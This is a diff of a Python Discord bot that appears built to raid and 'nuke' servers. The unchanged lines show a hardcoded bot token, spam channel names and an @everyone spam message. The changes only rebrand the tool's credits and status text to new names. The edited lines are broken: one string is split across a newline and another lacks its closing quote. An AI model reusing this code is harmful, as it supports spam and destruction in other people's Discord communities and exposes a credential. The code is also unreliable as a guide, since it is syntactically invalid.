@@ -14,7 +14,8 @@ token = "ODMyMDA2MTQ4Mzc4MDY3MDE0.YHdgGw.7-6KBBlnvIJzER_BTAYYnZenlBw"
 #  If it says Shared ID None is requesting privileged intents, go to discord developer portal and go to your bot and click on the bot tab and then scroll down to where it says privileged gateway intents and enable both, then it should work
 
 SPAM_CHANNEL =  ["s4turn#6666 on top" , "imagine :laugh:" , "s4turn#6666" , "Astrotrek On Top Ez","Astrotrek On Top","adopted ","nuked nuked","s4turn#6666 ","Sub To s4turn","Get on my level, Os4turn#6666","Sub To Astrotrek","s4turn#6666","s4turn#6666"]  
-SPAM_MESSAGE = ["@everyone Sub To S4turn"]
+SPAM_MESSAGE = ["@everyone Sub To Ocean_42
+"]
 
 intents = discord.Intents(messages=True, guilds=True, members=True)
 
@@ -31,14 +32,9 @@ async def on_ready():
 ██████╔╝╚██████╔╝██████╦╝  ░░░██║░░░╚█████╔╝
 ╚═════╝░░╚═════╝░╚═════╝░  ░░░╚═╝░░░░╚════╝░
 
-░█████╗░░██████╗████████╗██████╗░░█████╗░████████╗██████╗░███████╗██╗░░██╗
-██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║░██╔╝
-███████║╚█████╗░░░░██║░░░██████╔╝██║░░██║░░░██║░░░██████╔╝█████╗░░█████═╝░
-██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║░░░██║░░░██╔══██╗██╔══╝░░██╔═██╗░
-██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝░░░██║░░░██║░░██║███████╗██║░╚██╗
-╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+OCean_42
  ''')
-   await client.change_presence(activity=discord.Game(name="Sub To s4turn On Youtube + s4turn#6666"))
+   await client.change_presence(activity=discord.Game(name="Sub To Ocean_42 On Youtube + Devay#9080))
 
 @client.command()
 @commands.is_owner()
